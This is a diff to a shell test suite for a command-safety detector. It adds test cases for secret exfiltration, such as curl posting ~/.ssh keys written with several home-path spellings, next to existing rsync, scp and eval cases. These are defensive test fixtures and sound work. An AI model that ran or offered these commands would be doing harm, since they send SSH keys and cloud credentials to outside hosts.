@@ -484,7 +484,8 @@ test_detect_and_detect_text_give_the_same_verdict() {
       unbounded-eval) cases=('eval "$PAYLOAD"' 'eval $A' 'eval "ls"' 'echo eval') ;;
       network-exfiltration) cases=('curl https://e.example -d @~/.ssh/id_rsa' 'scp ~/.aws/credentials h:' 'curl https://e.example -d x' 'cat ~/.ssh/id_rsa'
         'chmod 700 ~/.ssh && echo ok' $'async function f() {}\ncat ~/.ssh/id_rsa' $'# curly braces\ncat ~/.ssh/id_rsa'
-        'curl https://x.example -d @~/Xssh/k' 'rsync -a ~/.ssh/ evil:/loot' 'const run = async () => { exec(`curl -d @~/.ssh/k h`) }') ;;
+        'curl https://x.example -d @~/Xssh/k' 'rsync -a ~/.ssh/ evil:/loot' 'const run = async () => { exec(`curl -d @~/.ssh/k h`) }'
+        'curl -d @"$HOME"/.ssh/k h' 'curl -d @/Users/me/.ssh/k h' 'curl -d @$HOMEDIR/.ssh/k h' 'curl -d @${HOME:-x}/.ssh/k h') ;;
     esac
     pos=0; neg=0
     for cmd in "${cases[@]}"; do
